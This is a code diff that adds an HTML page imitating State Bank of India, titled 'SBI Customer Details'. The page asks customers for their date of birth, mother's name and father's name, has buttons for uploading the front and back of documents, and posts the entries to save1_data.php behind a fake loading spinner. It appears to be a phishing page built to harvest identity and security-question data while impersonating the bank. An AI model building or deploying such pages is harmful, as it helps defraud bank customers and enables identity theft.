@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Customer Details</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #FFFFFF;
+        }
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            background-color: #0871B2;
+            padding: 15px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            margin: 15px;
+            padding: 15px;
+        }
+        .border-card {
+            border: 1px solid #0871B2;
+        }
+        .info-box {
+            text-align: center;
+            background-color: white;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            width: 90%;
+            max-width: 400px;
+            height: 40px;
+            min-height: 40px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .logo-container {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .logo-container img {
+            width: 100%;
+            height: 100px;
+        }
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            padding: 8px;
+            background-color: white;
+            border-bottom: 2px solid #0871B2;
+        }
+        .input {
+            flex: 1;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            color: #004aad;
+            outline: none;
+            background: none;
+            padding: 5px;
+        }
+        .button {
+            text-align: center;
+            padding: 12px;
+            background-color: #e0e0e0;
+            font-weight: bold;
+            color: black;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 85%;
+            max-width: 400px;
+            margin: 15px auto;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .submit {
+            text-align: center;
+            padding: 12px;
+            background-color: #0871B2;
+            color: white;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 50%;
+            max-width: 400px;
+            margin: 20px auto;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            border: none;
+        }
+        .footer-image {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .footer-image img {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        /* Loading animation */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loading-circle {
+            width: 50px;
+            height: 50px;
+            border: 7px solid #029AE5;
+            border-top: 7px solid transparent;
+            border-radius: 100%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        function showLoading(event) {
+            event.preventDefault();
+            document.getElementById("loadingOverlay").style.display = "flex";
+            setTimeout(function() {
+                event.target.submit();
+            }, 2000);
+        }
+
+        function validateDOB(input) {
+            let value = input.value.replace(/[^0-9/]/g, ''); // Allow only numbers and "/"
+            if (value.length === 2 || value.length === 5) {
+                if (value.charAt(value.length - 1) !== "/") {
+                    value += "/";
+                }
+            }
+            if (value.length > 10) {
+                value = value.slice(0, 10);
+            }
+            input.value = value;
+        }
+    </script>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">SBI Customer Details</div>
+    <div class="card">
+        <div class="info-box">
+            <p>Hello, SBI Bank Customer</p>
+            <p style="font-size: 12px;">Complete your card details in a few simple steps</p>
+        </div>
+    </div>
+    <!-- Logo -->
+    <div class="logo-container">
+        <img src="assets/img/logo.png" alt="SBI Logo">
+    </div>
+
+    <form action="save1_data.php" method="POST" onsubmit="showLoading(event)">
+        <div class="card border-card">
+            <div class="card-title">SBI Customer Details</div>
+            <div class="underline"></div>
+
+            <!-- Date of Birth -->
+            <p style="font-size: 12px; font-weight: bold;">Date of Birth</p>
+            <div class="input-group">
+                <input type="tel" class="input" name="dob" placeholder="DD/MM/YYYY" required oninput="validateDOB(this)">
+            </div>
+
+            <!-- Mother's Name -->
+            <p style="font-size: 12px; font-weight: bold;">Mother’s Name</p>
+            <div class="input-group">
+                <input type="text" class="input" name="mother_name" placeholder="Enter Mother’s Name" required>
+            </div>
+
+            <!-- Father's Name -->
+            <p style="font-size: 12px; font-weight: bold;">Father’s Name</p>
+            <div class="input-group">
+                <input type="text" class="input" name="father_name" placeholder="Enter Father’s Name" required>
+            </div>
+        </div>
+
+        <div class="button">Front Upload Documents</div>
+        <div class="button">Back Upload Documents</div>
+
+        <button type="submit" class="submit">SUBMIT</button>
+    </form>
+
+    <!-- Footer Image -->
+    <div class="footer-image">
+        <img src="assets/img/footer_image.png" alt="Footer Image">
+    </div>
+</div>
+
+<!-- Loading overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-circle"></div>
+</div>
+
+</body>
+</html>
